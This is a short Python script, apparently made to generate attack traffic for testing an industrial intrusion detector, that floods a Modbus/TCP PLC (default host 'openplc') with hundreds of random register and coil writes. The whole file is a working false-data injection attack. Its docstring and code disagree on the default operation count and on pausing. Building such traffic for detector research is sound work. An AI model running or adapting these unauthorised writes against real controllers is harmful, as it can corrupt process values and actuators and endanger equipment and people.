#!/usr/bin/env python3
"""
False-data injection -- VARIANT (burst form, for generalisation testing).

Different code from modbus_write.py, but a rapid BURST of randomised writes with
no pauses (single-register, coil, and multiple-register writes). Write-dominated
and non-periodic, so it resembles an injection burst rather than a replay loop.
Same attack (unauthorised writes), different code.

Usage:  python3 write3.py [host] [port] [ops]
        defaults: openplc 502 50
"""
import sys, random, time
from pymodbus.client import ModbusTcpClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502
OPS = int(sys.argv[3]) if len(sys.argv) > 3 else 500

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)

print(f"[*] VARIANT injection (burst) on {HOST}:{PORT}, {OPS} rapid writes...")
n = 0
for i in range(OPS):
    r = random.random()
    if r < 0.5:
        c.write_register(random.randint(0, 20), random.randint(0, 65535))
    elif r < 0.8:
        c.write_coil(random.randint(0, 20), bool(random.getrandbits(1)))
    else:
        c.write_registers(0, [random.randint(0, 65535) for _ in range(random.randint(2, 8))])
    n += 1
    time.sleep(random.uniform(0.005, 0.02))   # jittered (non-periodic) pacing so it spans a few seconds
c.close()

print(f"[*] Sent {n} write operations in a burst.")
print("[*] Done -- variant injection (burst) complete.")
